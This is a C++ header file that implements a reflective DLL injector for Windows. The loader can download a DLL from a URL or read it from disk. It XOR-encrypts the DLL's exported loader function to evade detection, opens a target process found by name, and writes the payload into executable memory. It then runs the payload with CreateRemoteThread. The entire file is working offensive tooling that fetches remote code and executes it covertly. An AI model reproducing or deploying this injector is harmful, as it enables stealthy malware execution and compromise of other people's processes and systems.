#pragma once

#include "framework.h"
#include "args.h"
#include "dll.h"
#include "utils.h"
#include <vector>
#include <iostream>
#include <memory>

class Injector
{

private:

	static constexpr auto EXPORTED_DLL_FUNC_NAME = "ReflectiveFunction";
	static constexpr auto EXPORTED_DLL_PRE_LOADER = "_123321_asdf21425";

	static const byte_t HEADER[];
	static const size_t HEADER_SIZE = 4 * sizeof(byte_t);
	static const size_t FUNC_SIZE = sizeof(size_t);
	static size_t DLL_HEADER_SIZE;

	i_arg_t arguments;
	std::vector<char> pefile;
	std::unique_ptr<DLLParser> pe_parser;

	HANDLE target_process = nullptr;
	DWORD target_pid = 0;
	byte_t* mem_base = nullptr;


public:

	Injector(int argc, char* argv[]) : arguments(argument_parser(argc, argv)) {
		DLL_HEADER_SIZE = HEADER_SIZE + Key::OB_XOR_KEY_SIZE + FUNC_SIZE;
	}

	~Injector() {
		cleanup();
	}

	bool execute() {
		if (!load_dll()) return false;
		if (!init_pe_parser()) return false;
		if (!prepare_target()) return false;
		if (!process_reflective_func()) return false;
		return perform_injection();
	}

private:

    bool load_dll() {
        if (arguments.dll_src == dll_path_type::url) {
            pefile = download_from_url(arguments.url);
        }
        else if (arguments.dll_src == dll_path_type::filename) {
            pefile = load_local_file(arguments.filename);
        }

        if (pefile.empty()) {
            std::cerr << "[-] Error while loading DLL file\n";
            return false;
        }

        std::cout << "[+] DLL loaded successfully, size: " << pefile.size() << " bytes\n";
        return true;
    }

    bool init_pe_parser() {
        pe_parser = std::make_unique<DLLParser>();
        PBYTE pebase = reinterpret_cast<PBYTE>(pefile.data());

        if (!pe_parser->initialize(reinterpret_cast<char*>(pebase), pefile.size())) {
            std::cerr << "[-] Cannot parse the DLL\n";
            return false;
        }

        std::cout << "[+] DLL parser initialized successfully\n";
        return true;
    }

    bool prepare_target() {

        if (arguments.is_local) {
            target_pid = GetCurrentProcessId();
            target_process = GetCurrentProcess();
            std::cout << "[+] Local injection mode, PID: " << target_pid << std::endl;
            return true;
        }
        else
        {
			std::cout << "[+] Looking for process: " << arguments.process << std::endl;
			target_pid = ret_pid_by_name(get_wc(arguments.process));

			if (target_pid == 0) {
				std::cerr << "[-] Process not found\n";
				return false;
			}

			std::cout << "[+] Process found with PID: " << target_pid << std::endl;
			target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);

			if (target_process == nullptr) {
				std::cerr << "[-] Failed to open target process\n";
				return false;
			}

			return true;
        }

        return false;

    }

    bool process_reflective_func() {

        auto reflective_loader_func = pe_parser->retrieve_func_raw_ptr(EXPORTED_DLL_FUNC_NAME);
        if (reflective_loader_func == nullptr) {
            std::cerr << "[-] Failed to find reflective loader function\n";
            return false;
        }

        // calc func size
        auto reflective_loader_func_end = pe_parser->find_func_end(
            reinterpret_cast<byte_t*>(reflective_loader_func));
        size_t rf_loader_size = reflective_loader_func_end -
            reinterpret_cast<byte_t*>(reflective_loader_func);

        std::cout << "[+] Reflective function found, size: " << rf_loader_size << " bytes\n";

        // encrypt func body
        encrypt_data(pe_parser->get_base() +
            reinterpret_cast<dword_t>(reflective_loader_func),
            rf_loader_size);

        std::cout << "[+] Reflective function encrypted\n";
        return true;
    }


    bool perform_injection() {
        mem_base = alloc_and_write_to_target_memory();
        if (mem_base == nullptr) {
            return false;
        }

        return create_execution_thread();
    }

    byte_t* alloc_and_write_to_target_memory() {
        size_t total_size = pefile.size() + DLL_HEADER_SIZE;
        byte_t* remote_base = nullptr;

        if (arguments.is_local) {
            remote_base = alloc_loc_mem(total_size);
        }
        else {
            remote_base = alloc_remote_mem(total_size);
        }

        if (remote_base == nullptr) {
            return nullptr;
        }

        if (!write_dll_data(remote_base, total_size)) {
            if (arguments.is_local) {
                VirtualFree(remote_base, 0, MEM_RELEASE);
            }
            else {
                VirtualFreeEx(target_process, remote_base, 0, MEM_RELEASE);
            }
            return nullptr;
        }

        printf("[+] DLL data written to: 0x%p\n", remote_base);
        return remote_base;
    }

    byte_t* alloc_loc_mem(size_t size) {
        byte_t* memory = reinterpret_cast<byte_t*>(
            VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

        if (memory == nullptr) {
            std::cerr << "[-] Failed to allocate local memory\n";
        }

        return memory;
    }

    byte_t* alloc_remote_mem(size_t size) {
        byte_t* memory = reinterpret_cast<byte_t*>(
            VirtualAllocEx(target_process, nullptr, size,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

        if (memory == nullptr) {
            std::cerr << "[-] Failed to allocate remote memory\n";
        }

        return memory;
    }

    bool write_dll_data(byte_t* remote_base, size_t total_size) {
        std::vector<byte_t> buffer(total_size);

        construct_dll_header(buffer.data());

        memcpy(buffer.data() + DLL_HEADER_SIZE, pefile.data(), pefile.size());

        if (arguments.is_local) {
            memcpy(remote_base, buffer.data(), total_size);
            return true;
        }
        else {
            SIZE_T bytes_written = 0;
            return WriteProcessMemory(target_process, remote_base,
                buffer.data(), total_size, &bytes_written) != FALSE;
        }
    }

    void construct_dll_header(byte_t* buffer) {
        // magic number
        memcpy(buffer, HEADER, HEADER_SIZE);

        // encryption key
        memcpy(buffer + HEADER_SIZE, Key::OB_XOR_KEY, Key::OB_XOR_KEY_SIZE);

        // reflective function size
        auto reflective_loader_func = pe_parser->retrieve_func_raw_ptr(EXPORTED_DLL_FUNC_NAME);
        auto reflective_loader_func_end = pe_parser->find_func_end(
            reinterpret_cast<byte_t*>(reflective_loader_func));
        size_t rf_loader_size = reflective_loader_func_end -
            reinterpret_cast<byte_t*>(reflective_loader_func);

        memcpy(buffer + HEADER_SIZE + Key::OB_XOR_KEY_SIZE, &rf_loader_size, FUNC_SIZE);
    }

    bool create_execution_thread() {
        auto pre_loader_func = pe_parser->retrieve_func_raw_ptr(EXPORTED_DLL_PRE_LOADER);
        if (pre_loader_func == nullptr) {
            std::cerr << "[-] Failed to find pre-loader function\n";
            return false;
        }

        auto function_address = mem_base +
            reinterpret_cast<dword_t>(pre_loader_func) +
            DLL_HEADER_SIZE;

        printf("[+] Pre-loader function address: 0x%p\n", function_address);

        DWORD thread_id = 0;
        HANDLE thread = nullptr;

        if (arguments.is_local) {
            thread = CreateThread(nullptr, 0,
                reinterpret_cast<LPTHREAD_START_ROUTINE>(function_address),
                nullptr, CREATE_SUSPENDED, &thread_id);
        }
        else {
            thread = CreateRemoteThread(target_process, nullptr, 0,
                reinterpret_cast<LPTHREAD_START_ROUTINE>(function_address),
                nullptr, CREATE_SUSPENDED, &thread_id);
        }

        if (thread == nullptr) {
            std::cerr << "[-] Failed to create execution thread\n";
            return false;
        }

        std::cout << "[+] Thread created successfully, ID: " << thread_id << std::endl;

        ResumeThread(thread);

        wait_thread(thread);

        CloseHandle(thread);
        return true;
    }

    void wait_thread(HANDLE thread) {
        if (arguments.is_local) {
            std::cout << "[!] Local injection complete. Press any key to exit...\n";
            getchar();
        }
        else {
            WaitForSingleObject(thread, INFINITE);
            std::cout << "[+] Remote injection completed\n";
        }
    }

    void cleanup() {
        if (target_process != nullptr && !arguments.is_local) {
            CloseHandle(target_process);
        }
    }
};

